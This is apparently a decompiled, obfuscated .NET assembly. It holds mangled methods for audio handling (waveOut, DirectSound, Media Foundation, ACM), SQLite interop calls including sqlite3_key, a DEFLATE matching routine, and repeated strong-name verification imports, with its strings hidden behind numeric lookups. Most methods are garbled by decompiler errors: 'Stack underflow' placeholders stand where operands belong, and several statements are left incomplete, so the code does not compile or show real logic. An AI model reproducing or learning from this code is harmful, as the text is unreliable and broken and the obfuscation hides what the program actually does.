		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_bind_int")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003, uint _0004);

		static byte[] _0001(_0080._0004 _0002)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0080._0004)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		unsafe static void _0001(ref double _0002, _001C._0010 _0003, ref double P_2)
		{
			//IL_0078: Incompatible stack heights: 0 vs 3
			//IL_007f: Incompatible stack heights: 0 vs 1
			//IL_0085: Incompatible stack heights: 0 vs 2
			_ = global::_0014._0096_0002;
			_ = global::_0015._0001_0003;
			double num = *(double*)(nint)/*Error near IL_000d: Stack underflow*/;
			/*Error near IL_007f: Stack underflow*/(num);
			_ = global::_0015._0001_0003;
			double num2 = *(double*)(nint)/*Error near IL_0017: Stack underflow*/;
			double num3 = /*Error near IL_001c: Stack underflow*/(num2);
			double num4 = ((/*Error near IL_0023: Stack underflow*/((double)/*Error near IL_0023: Stack underflow*/, num3) > _0003._0002) ? 1.0 : 0.0);
			num4 += 1E-25;
			_0018._0001(ref _0003._0003, (global::_0002._0013)_0003, num4);
			num4 = _0003._0003 - 1E-25;
			P_2 *= num4;
			_0002 *= num4;
		}

		static IList<_007F._0003> _0001(_001D._0001 _0002, IntPtr _0003, global::_0018._0003 _0004)
		{
			//IL_0148: Incompatible stack heights: 0 vs 1
			//IL_0154: Incompatible stack heights: 0 vs 1
			new List<_007F._0003>();
			List<_007F._0003> list = (List<_007F._0003>)/*Error near IL_014e: Stack underflow*/;
			if (((global::_0018._0003)/*Error near IL_0014: Stack underflow*/)._0001._0007 > 0)
			{
				int num = Marshal.SizeOf(typeof(global::_0015._0003._0008));
				global::_0015._0003._0003 obj = default(global::_0015._0003._0003);
				IntPtr intPtr = Marshal.AllocHGlobal(num * _0004._0001._0007);
				obj._0001 = Marshal.SizeOf((object)obj);
				obj._0002 = _0004._0001._0004;
				obj._0004 = _0004._0001._0007;
				obj._0001 = intPtr;
				obj._0005 = Marshal.SizeOf(typeof(global::_0015._0003._0008));
				try
				{
					MmResult mmResult = _0018._0001(_0003, ref obj, _001D._0001._0002 | _0002);
					if (mmResult != 0)
					{
						throw new global::_0013._0001(mmResult, _0080._0014._0001(107380452));
					}
					for (int i = 0; i < obj._0004; i++)
					{
						global::_0015._0003._0008 obj2 = (global::_0015._0003._0008)Marshal.PtrToStructure((IntPtr)(intPtr.ToInt64() + num * i), typeof(global::_0015._0003._0008));
						int num2 = _0004._0001._0004;
						int num3 = obj2._0001;
						int num4 = _0004._0001._0005;
						_007F._0003 item = _0018._0001(num4, num2, _0003, num3, _0002);
						list.Add(item);
					}
					return list;
				}
				finally
				{
					Marshal.FreeHGlobal(intPtr);
				}
			}
			return list;
		}

		static global::_0007._001B _0001()
		{
			_0091_0002 obj = _0091_0002._009C_0005;
			object obj2 = global::_0007._001C._0001;
			object obj3 = default(object);
			if (0 == 0)
			{
				obj3 = obj2;
			}
			obj(obj2);
			try
			{
				return global::_0007._001C._0001;
			}
			finally
			{
				_0091_0002._009D_0005(obj3);
			}
		}

		unsafe static byte[] _0001(string _0002)
		{
			//IL_000e: Incompatible stack heights: 0 vs 2
			//IL_0015: Incompatible stack heights: 0 vs 1
			string text = null;
			_ = ref text;
			_0018._0001(ref *(string*)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/);
			return (byte[])/*Error near IL_000a: Stack underflow*/;
		}

		static bool _0001(global::_0007._0007 P_0)
		{
			//IL_0068: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 2
			_001C._0004 obj = ((global::_0007._0007)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			int num;
			try
			{
				num = P_0._0001.Read(P_0._0001, 0, P_0._0001.Length);
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			if (num == 0)
			{
				return false;
			}
			for (int i = num; i < P_0._0001.Length; i++)
			{
				P_0._0001[i] = 0;
			}
			_0018._0001(P_0);
			return true;
		}

		static void _0001(BinaryReader _0002, global::_0001._0015 P_1)
		{
			//IL_007c: Incompatible stack heights: 0 vs 1
			//IL_0083: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107380423);
			_0018._0001((string)/*Error near IL_0083: Stack underflow*/);
			int num = (int)/*Error near IL_0089: Stack underflow*/;
			if (global::_001A._007E_001D_0003(_0002) != num)
			{
				throw new FormatException(_0080._0014._0001(107380446));
			}
			int num2 = global::_001A._007E_001D_0003(_0002);
			P_1._0003 = global::_0012._007E_0092_0002(_0002);
			P_1._0002 = global::_0012._007E_0092_0002(_0002);
			global::_0012._007E_0092_0002(_0002);
			_0083_0002._007E_008C_0005(_0002, num2 - 24);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001()
		{
			_0018._0001();
			global::_0015._0016.Log += global::_0015._0016._0002;
		}

		static void _0001(int _0002, global::_000F._0007 P_1)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 2
			if (((global::_000F._0007)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = ((global::_000F._0007)/*Error near IL_0010: Stack underflow*/)._0001.Length;
				if (/*Error near IL_0016: Stack underflow*/ >= /*Error near IL_0016: Stack underflow*/)
				{
					return;
				}
			}
			P_1._0001 = new float[_0002];
		}

		[DllImport("dsound.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, EntryPoint = "DirectSoundCreate", ExactSpelling = true, SetLastError = true)]
		static extern void _0001(ref Guid _0002, [MarshalAs(UnmanagedType.Interface)] out global::_000E._0008._000E _0003, IntPtr _0004);

		static string _0001(string _0002, string _0003, string _0004, bool _0005)
		{
			//IL_00cd: Incompatible stack heights: 0 vs 1
			//IL_00d3: Incompatible stack heights: 0 vs 1
			//IL_00d9: Incompatible stack heights: 0 vs 1
			try
			{
				if ((int)/*Error near IL_0007: Stack underflow*/ == 0 || (int)/*Error near IL_000e: Stack underflow*/ == 0)
				{
					return (string)/*Error near IL_0013: Stack underflow*/;
				}
				XmlDocument xmlDocument = new XmlDocument();
				_0082_0003._007E_0016_0007(xmlDocument, _0002);
				if (_008D_0006._007E_0081_0010(xmlDocument, _0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107380353), new object[1] { _0003 })) is XmlElement xmlElement)
				{
					string text = null;
					if (global::_0004._007E_0082(xmlElement, _0080._0014._0001(107388827)))
					{
						text = _0018_0006._007E_0008_0010(xmlElement, _0080._0014._0001(107388827));
					}
					if (!global::_001C._0096_0003(text))
					{
						if (_0005)
						{
							text = global::_001E._009E_0003(text);
						}
						text = _0018._0001(text);
						text = _0018._0001(text, _0002);
					}
					if (text != null)
					{
						return text;
					}
					return _0004;
				}
				return _0004;
			}
			catch (Exception ex)
			{
				try
				{
					_0015_0004._001E_0008(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107380296), new object[3] { _0003, _0002, ex }));
					return _0004;
				}
				catch
				{
					return _0004;
				}
			}
		}

		[DllImport("kernel32", EntryPoint = "MoveFileEx")]
		static extern bool _0001(string _0002, string _0003, int _0004);

		static bool _0001(global::_0017._0080 _0002)
		{
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_0066: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107380674);
			string text = (string)/*Error near IL_0063: Stack underflow*/;
			object obj = default(object);
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0 && _0018._0001(_0002, text, (object)null, ref obj))
			{
				return obj != null;
			}
			if (_0002 == null && _0018._0001((object)null, ref obj, text))
			{
				return obj != null;
			}
			obj = _0018._0001(text, (string)null);
			if (_0002 != null)
			{
				_0018._0001(_0002, text, obj);
			}
			else
			{
				_0018._0001(text, obj);
			}
			return obj != null;
		}

		static string _0001(string _0002, string _0003)
		{
			//IL_00d1: Incompatible stack heights: 0 vs 2
			//IL_00db: Incompatible stack heights: 0 vs 1
			//IL_00e1: Incompatible stack heights: 0 vs 1
			_ = global::_001E._009F_0003;
			_0080._0014._0001(107380665);
			/*Error near IL_00db: Stack underflow*/((string)/*Error near IL_00db: Stack underflow*/);
			if ((int)/*Error near IL_0016: Stack underflow*/ != 0)
			{
				return (string)/*Error near IL_001c: Stack underflow*/;
			}
			if (_0002 == null)
			{
				return _0003;
			}
			bool flag = true;
			string text = null;
			if (global::_001E._009F_0003(_0080._0014._0001(107380632)) != null)
			{
				flag = false;
			}
			else if (global::_001E._009F_0003(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107380587), new object[1] { _0002 })) != null)
			{
				flag = false;
			}
			text = global::_001E._009F_0003(_0002);
			if (!global::_001C._0096_0003(text))
			{
				if (flag)
				{
					text = global::_001E._009E_0003(text);
				}
				text = _0018._0001(text);
			}
			if (text != null)
			{
				return text;
			}
			if (global::_001E._009F_0003(_0080._0014._0001(107380598)) != null)
			{
				return _0003;
			}
			return _0018._0001(_0018._0001(), _0002, _0003, flag);
		}

		static void _0001(string _0002, int _0003, _001C._0004 _0004 = 192000)
		{
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			Guid guid = _001F._0011._0007;
			_ = ((_001C._0004)/*Error near IL_0052: Stack underflow*/).WaveFormat;
			global::_0005._0005 obj = (global::_0005._0005)/*Error near IL_000c: Stack underflow*/;
			MediaFoundationEncoder mediaFoundationEncoder = new MediaFoundationEncoder(_0018._0001(_0003, guid, obj) ?? throw new InvalidOperationException(_0080._0014._0001(107380565)));
			try
			{
				_0018._0001(_0002, _0004, mediaFoundationEncoder);
			}
			finally
			{
				if (mediaFoundationEncoder != null)
				{
					global::_0008._007E_0098(mediaFoundationEncoder);
				}
			}
		}

		static double _0001(global::_0012._0005 P_0)
		{
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Expected F8, but got Unknown
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 2
			//IL_001f: Incompatible stack heights: 0 vs 1
			_ = (double)((global::_0012._0005)/*Error near IL_0007: Stack underflow*/)._0003;
			_ = ((global::_0012._0005)/*Error near IL_001f: Stack underflow*/).Mp3WaveFormat;
			int num = ((global::_0005._0005)/*Error near IL_0011: Stack underflow*/)._0001;
			return /*Error near IL_0013: Stack underflow*// (double)num;
		}

		static void _0001(int _0002, global::_0001._0010 P_1)
		{
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 2
			//IL_0026: Incompatible stack heights: 0 vs 1
			_ = ((global::_0001._0010)/*Error near IL_0007: Stack underflow*/)._0001;
			_0018._0001((IntPtr)/*Error near IL_0026: Stack underflow*/, (int)/*Error near IL_0026: Stack underflow*/);
			_0018._0001(_0003: _0080._0014._0001(107380484), _0002: (MmResult)/*Error near IL_001a: Stack underflow*/);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mfplat.dll", EntryPoint = "MFCreateAttributes", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001([MarshalAs(UnmanagedType.Interface)] out global::_0008._000E _0002, [In] int _0003);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_errstr")]
		static extern IntPtr _0001(_0080._0017 _0002);

		static void _0001(int _0002, byte[] _0003, int _0004, global::_0004._0016 P_3)
		{
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107379951);
				new ArgumentNullException((string?)/*Error near IL_005c: Stack underflow*/);
				throw /*Error near IL_000e: Stack underflow*/;
			}
			if (_0002 < 0)
			{
				throw new ArgumentException(_0080._0014._0001(107379942));
			}
			if (_0004 < 0)
			{
				throw new ArgumentException(_0080._0014._0001(107379933));
			}
			if (_0004 > _0003.Length)
			{
				throw new ArgumentException(_0080._0014._0001(107379896));
			}
		}

		static int _0001(IntPtr _0002, int _0003)
		{
			//IL_000d: Incompatible stack heights: 0 vs 2
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = _009B_0005._008D_000F;
			/*Error near IL_0017: Stack underflow*/((IntPtr)/*Error near IL_0017: Stack underflow*/, (int)/*Error near IL_0017: Stack underflow*/);
			return (int)/*Error near IL_000c: Stack underflow*/;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0005._0005 _0001(IntPtr _0002)
		{
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_0071: Incompatible stack heights: 0 vs 1
			global::_0004._000F._0001<global::_0005._0005>((IntPtr)/*Error near IL_0071: Stack underflow*/);
			global::_0005._0005 obj = (global::_0005._0005)/*Error near IL_0077: Stack underflow*/;
			switch (obj._0001)
			{
			case WaveFormatEncoding.Pcm:
				obj._0004 = 0;
				break;
			case WaveFormatEncoding.Extensible:
				obj = global::_0004._000F._0001<global::_0002._0005>(_0002);
				break;
			case WaveFormatEncoding.Adpcm:
				obj = global::_0004._000F._0001<global::_0006._0002>(_0002);
				break;
			case WaveFormatEncoding.Gsm610:
				obj = global::_0004._000F._0001<global::_0010._0005>(_0002);
				break;
			default:
				if (obj._0004 > 0)
				{
					obj = global::_0004._000F._0001<global::_0013._0007>(_0002);
				}
				break;
			}
			return obj;
		}

		static void _0001(_0080._0011 P_0)
		{
			//IL_001c: Incompatible stack heights: 0 vs 2
			//IL_001f: Incompatible stack heights: 0 vs 2
			//IL_0026: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((_0080._0011)/*Error near IL_000c: Stack underflow*/)._0001;
			ref Guid reference = ref ((_0080._0011)/*Error near IL_0013: Stack underflow*/)._0001;
			((global::_0006._0014)/*Error near IL_0026: Stack underflow*/)._0002(ref reference);
			/*Error near IL_001a: Stack underflow*/((int)/*Error near IL_001a: Stack underflow*/);
		}

		static void _0001(long _0002, global::_0001._007F P_1)
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0001._007F)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002d: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_0018: Stack underflow*/;
			}
			_0018._0001(P_1._0001, _0002);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_config")]
		static extern _0080._0017 _0001(global::_0016._001B _0002, global::_0015._0015 _0003, IntPtr _0004);

		static NameValueCollection _0001(_0014 P_0)
		{
			//IL_0082: Incompatible stack heights: 0 vs 1
			//IL_0092: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_008c: Stack underflow*/);
			if (((_0014)/*Error near IL_0011: Stack underflow*/)._0001 == null || P_0._0001._0001 == null)
			{
				throw new InvalidOperationException();
			}
			int num = P_0._0004;
			NameValueCollection nameValueCollection = new NameValueCollection(num);
			for (int i = 0; i < num; i++)
			{
				string text = P_0._0001._0001._0001(P_0._0001, i);
				string text2 = P_0._0001._0001._0005(P_0._0001, i);
				_008E_0006._007E_0082_0010(nameValueCollection, text, text2);
			}
			return nameValueCollection;
		}

		static void _0001(global::_0001._007F _0002, string P_1)
		{
			//IL_0043: Incompatible stack heights: 0 vs 2
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0001._007F)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_004a: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_0018: Stack underflow*/;
			}
			byte[] array = _0018._0001(P_1);
			if (array == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107388827));
			}
			_0018._0001(_0002._0001, array, array.Length);
		}

		static byte[] _0001(byte[] _0002, byte[] _0003, byte[] _0004)
		{
			//IL_000e: Incompatible stack heights: 0 vs 2
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			_ = 3;
			return _0018._0001((int)/*Error near IL_000c: Stack underflow*/, (byte[])/*Error near IL_000c: Stack underflow*/, (byte[])/*Error near IL_000c: Stack underflow*/, (byte[])/*Error near IL_000c: Stack underflow*/);
		}

		static void _0001(global::_0017._0015 _0002, int P_1)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0009: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0015: Stack underflow*/)._0001;
			AsioError num = /*Error near IL_001b: Stack underflow*/(pUnknown, P_1);
			string text = _0080._0014._0001(107379867);
			_0018._0001((global::_0017._0015)/*Error near IL_002a: Stack underflow*/, num, text);
		}

		[DllImport("mf.dll", EntryPoint = "MFTranscodeGetAudioOutputAvailableTypes", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In] global::_0001._0013 _0003, [In] global::_0008._000E _0004, [MarshalAs(UnmanagedType.Interface)] out _001A._000E _0005);

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_create_function_interop")]
		static extern _0080._0017 _0001(IntPtr _0002, byte[] _0003, int _0004, int _0005, IntPtr _0006, _0019._001F _0007, _0019._001F _0008, global::_0002._001C _000E, int _000F);

		static int _0001([In][MarshalAs(UnmanagedType.Interface)] _001F._0015 _0002, _001C._0013 P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = ((_001F._0015)/*Error near IL_0007: Stack underflow*/)._0001;
			((global::_0006._0015)/*Error near IL_0017: Stack underflow*/)._0002((_001C._0013)/*Error near IL_0017: Stack underflow*/);
			return (int)/*Error near IL_000c: Stack underflow*/;
		}

		static void _0001()
		{
			//IL_0105: Incompatible stack heights: 0 vs 1
			//IL_0111: Incompatible stack heights: 0 vs 1
			_0018._0001();
			global::_0007._001B obj = (global::_0007._001B)/*Error near IL_010b: Stack underflow*/;
			if ((int)/*Error near IL_0011: Stack underflow*/ != 0)
			{
				obj._0001();
				return;
			}
			object obj2;
			_0091_0002._009C_0005(obj2 = global::_0007._001C._0001);
			try
			{
				IEnumerator<KeyValuePair<string, global::_0007._001C._0001>> enumerator = global::_0007._001C._0001.GetEnumerator();
				try
				{
					while (global::_001B._007E_0086_0003(enumerator))
					{
						KeyValuePair<string, global::_0007._001C._0001> current = enumerator.Current;
						if (current.Value == null)
						{
							continue;
						}
						Queue<WeakReference> queue = current.Value._0001;
						while (queue.Count > 0)
						{
							WeakReference weakReference = queue.Dequeue();
							if (weakReference != null)
							{
								global::_000E._001F obj3 = _0083_0003._007E_001A_0007(weakReference) as global::_000E._001F;
								if (obj3 != null)
								{
									global::_0008._007E_0007_0002(obj3);
								}
								_0091_0002._009E_0005(obj3);
							}
						}
						if (global::_0007._001C._0001 <= current.Value._0001)
						{
							global::_0007._001C._0001 = current.Value._0001 + 1;
						}
					}
				}
				finally
				{
					if (enumerator != null)
					{
						global::_0008._007E_0098(enumerator);
					}
				}
				global::_0007._001C._0001.Clear();
			}
			finally
			{
				_0091_0002._009D_0005(obj2);
			}
		}

		static void _0001(global::_0008._0001 _0002, string P_1)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			try
			{
				_0018._0001((global::_0008._0001)/*Error near IL_002a: Stack underflow*/);
				byte[] array = (byte[])/*Error near IL_002d: Stack underflow*/;
				if (array != null)
				{
					_000F_0005._0095_000E(P_1, array);
				}
			}
			catch
			{
			}
		}

		[DllImport("winmm.dll", EntryPoint = "midiInOpen")]
		static extern MmResult _0001(out IntPtr _0002, IntPtr _0003, IntPtr _0004, IntPtr _0005, int _0006);

		static bool _0001()
		{
			//IL_0027: Invalid comparison between Unknown and O
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			try
			{
				object obj;
				_0091_0002._009C_0005(obj = global::_0017._0083._0001);
				try
				{
					_ = global::_0017._0083._0001.HasValue;
					if ((int)/*Error near IL_001a: Stack underflow*/ == 0)
					{
						_008F_0006._0083_0010(global::_0017._0083._0001);
						new bool?((object)/*Error near IL_0029: Stack underflow*/ != null);
						global::_0017._0083._0001 = (bool?)/*Error near IL_0033: Stack underflow*/;
					}
					return global::_0017._0083._0001.Value;
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
			catch
			{
			}
			return false;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_db_filename")]
		static extern IntPtr _0001(IntPtr _0002, byte[] _0003);

		[DllImport("winmm.dll", EntryPoint = "waveOutGetNumDevs")]
		static extern int _0001();

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_key")]
		static extern _0080._0017 _0001(IntPtr _0002, byte[] _0003, int _0004);

		static void _0001(byte[] _0002, global::_0017._007F._0008 P_1)
		{
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			((global::_0017._007F._0008)/*Error near IL_0009: Stack underflow*/)._0002 = (byte[])/*Error near IL_0009: Stack underflow*/;
			((global::_0017._007F._0008)/*Error near IL_0011: Stack underflow*/)._0017 = 0;
			P_1._0018 = _0002.Length;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("Msacm32.dll", EntryPoint = "acmMetrics")]
		static extern MmResult _0001(IntPtr _0002, global::_0005._0004 _0003, out int _0004);

		static void _0001(string _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 2
			//IL_001f: Incompatible stack heights: 0 vs 1
			_ = _0090_0006._0084_0010;
			/*Error near IL_001f: Stack underflow*/((string)/*Error near IL_001f: Stack underflow*/);
			FileStream fileStream = (FileStream)/*Error near IL_0022: Stack underflow*/;
			global::_0008._007E_0099(fileStream);
		}

		static void _0001(bool _0002, _0005 P_1)
		{
			//IL_0098: Incompatible stack heights: 0 vs 1
			//IL_009e: Incompatible stack heights: 0 vs 2
			//IL_00a8: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._0099_0005;
			IntPtr intPtr = ((_0005)/*Error near IL_0015: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_00a8: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0021: Stack underflow*/ != 0)
			{
				_0018._0001(P_1._0001, P_1._0001, _0098._0089_0004(P_1._0001));
				P_1._0001 = IntPtr.Zero;
			}
			if (P_1._0002.IsAllocated)
			{
				P_1._0002.Free();
			}
			if (P_1._0001.IsAllocated)
			{
				P_1._0001.Free();
			}
			if (P_1._0003.IsAllocated)
			{
				P_1._0003.Free();
			}
		}

		static bool _0001(object _0002)
		{
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			if (/*Error near IL_0003: Stack underflow*/ is bool)
			{
				return (bool)(object)/*Error near IL_000c: Stack underflow*/;
			}
			return global::_0001._001A._0001(_0018._0001(_0003: (IFormatProvider)_008F_0003._008B_0007(), _0002: (object)/*Error near IL_0022: Stack underflow*/));
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_config")]
		static extern _0080._0017 _0001(global::_0016._001B _0002);

		static bool _0001(int _0002, global::_0017._007F._0008 P_1)
		{
			//IL_0270: Incompatible stack heights: 0 vs 1
			int num = 128;
			int num2 = 128;
			short[] array = ((global::_0017._007F._0008)/*Error near IL_001e: Stack underflow*/)._0002;
			int num3 = P_1._0014;
			int num4 = P_1._0014 + P_1._0012;
			int num5 = Math.Max(P_1._0012, 2);
			int num6 = Math.Max(P_1._0014 - 32506, 0);
			int num7 = P_1._0014 + 258 - 1;
			byte b = P_1._0001[num4 - 1];
			byte b2 = P_1._0001[num4];
			if (num5 >= 8)
			{
				num >>= 2;
			}
			if (num2 > P_1._0015)
			{
				num2 = P_1._0015;
			}
			do
			{
				if (P_1._0001[_0002 + num5] != b2 || P_1._0001[_0002 + num5 - 1] != b || P_1._0001[_0002] != P_1._0001[num3] || P_1._0001[_0002 + 1] != P_1._0001[num3 + 1])
				{
					continue;
				}
				int num8 = _0002 + 2;
				num3 += 2;
				while (P_1._0001[++num3] == P_1._0001[++num8] && P_1._0001[++num3] == P_1._0001[++num8] && P_1._0001[++num3] == P_1._0001[++num8] && P_1._0001[++num3] == P_1._0001[++num8] && P_1._0001[++num3] == P_1._0001[++num8] && P_1._0001[++num3] == P_1._0001[++num8] && P_1._0001[++num3] == P_1._0001[++num8] && P_1._0001[++num3] == P_1._0001[++num8] && num3 < num7)
				{
				}
				if (num3 > num4)
				{
					P_1._0011 = _0002;
					num4 = num3;
					num5 = num3 - P_1._0014;
					if (num5 >= num2)
					{
						break;
					}
					b = P_1._0001[num4 - 1];
					b2 = P_1._0001[num4];
				}
				num3 = P_1._0014;
			}
			while ((_0002 = array[_0002 & 0x7FFF] & 0xFFFF) > num6 && --num != 0);
			P_1._0012 = Math.Min(num5, P_1._0015);
			return P_1._0012 >= 3;
		}

		static void _0001(global::_0004._0001 P_0)
		{
			//IL_00d8: Incompatible stack heights: 0 vs 1
			//IL_00e2: Incompatible stack heights: 0 vs 1
			try
			{
				_0018._0001(((global::_0004._0001)/*Error near IL_000c: Stack underflow*/)._0001);
				byte[] array = (byte[])/*Error near IL_00e8: Stack underflow*/;
				if (array != null && !global::_001C._0097_0003(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0018, global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0])))
				{
					_000F_0005._0095_000E(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0018, global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0]), array);
					_0018._0001(P_0, global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0018, global::_0002._007E_0006(_0080._0014._0001(107362089))));
				}
			}
			catch
			{
			}
		}

		static _0080._0017 _0001(global::_0017._0080 P_0)
		{
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_003f: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107379814));
			}
			P_0._0001._0002(_0002: true);
			return P_0._0001._0002();
		}

		static float _0001(_0019._0007 _0002, float P_1)
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_009b: Incompatible stack heights: 0 vs 2
			//IL_00a1: Incompatible stack heights: 0 vs 1
